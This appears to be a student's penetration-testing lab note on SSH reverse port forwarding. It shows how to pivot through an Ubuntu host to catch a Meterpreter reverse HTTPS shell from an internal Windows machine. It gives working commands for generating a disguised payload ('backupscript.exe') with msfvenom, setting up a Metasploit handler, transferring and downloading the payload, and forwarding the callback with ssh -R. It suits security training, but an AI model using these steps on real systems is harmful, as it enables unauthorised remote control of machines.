# Reverse Port Forwarding
- ![[33.png]]
- From previous example, we can pivot into the Windows host through the Ubuntu server
- But what if want reverse shell?
	- Windows machine cannot route traffic leaving its network (172.16.5.0/23) to reach us

Example: Want a Meterpreter HTTP reverse shell payload
- Want the Windows server to connect to Attack Host, wit the Ubuntu as pivot
- Host a MetaSploit listener on localhost 8000
- Use Port 8080 on Ubuntu server to forward all reverse packets back to attack host 8000 port

1. Create Windows payload with msfvenom
	- (Run this locally first of course)
	- `msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080`
	- Set the lhost to the **INTERNAL** IP of the Pivot Host (ubuntu) since this script is to be run by the WIndows server
2. Start the Metasploit listener on local machine
	- `msfconsole`
	- `use exploit/multi/handler`
		- Multi handler: Metasploit listener modulewhich works as a catcher (waits for incoming connection from payload), and handles the session when it connects back
		- See end of [[6. Metasploit]]
	- `set payload windows/x64/meterpreter/reverse_https`
	- `set lhost 0.0.0.0`
		- Because the port forwarding will make Ubuntu machine send the packets through our localhost 8000
	- `set lport 8000
	- `set payload `
	- `run windows/x64/meterpreter/reverse_https`
3. Transfer the payload from attack host to Windows
	- First transfer to Ubuntu machine since we have direct access to it.
		- On local machine, copy it to ubuntu with scp
		- `scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
	- Then transfer it from ubuntu server to windows machine
		- See [[2. Windows Downloads]]
		- Host a python3 webserver on pivot host
			- `python3 -m http.server 8123`
		- Then download it on the Windows machine with Invoke-WebRequest
			- Use the previous technique (dynamic port forwarding) to get access to the Windows machine
			- `Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"`
4. Use SSH remote port forwarding to forward connections from Ubuntu server's port 8080 to our msfconsole's listener on 8000
	- Run the following on our kali machine
	- `ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN`
		- `ssh -R [pivot_ip]:[pivot_port]:[local_host]:[local_port] user@host
		- Ubuntu opens up port 8080, forwards anything hitting 127.0.0.1:8080 on ubuntu into our kali:8000
		- 0.0.0.0 on local side means forward to **any interface** on my machine (don't want SSH to guess wrong)
5. Execute the backup script on Windows
	- RDP into windows then run the script